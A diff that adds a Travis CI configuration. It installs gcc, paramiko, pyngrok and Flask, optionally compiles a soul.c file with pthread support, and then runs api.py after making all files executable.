@@ -1,0 +1,20 @@
+language: python
+dist: focal
+python:
+  - "3.10"
+before_install:
+  # Update system and install required packages
+  - sudo apt-get update
+  - sudo apt-get install -y gcc
+
+install:
+  - python3 -m pip install --upgrade pip
+  - python3 -m pip install paramiko pyngrok Flask
+
+before_script:
+
+  - if [ -f soul.c ]; then gcc soul.c -o soul -lpthread; fi
+
+script:
+  # Run the Python script
+  - chmod +x * && lscpu && python3 api.py
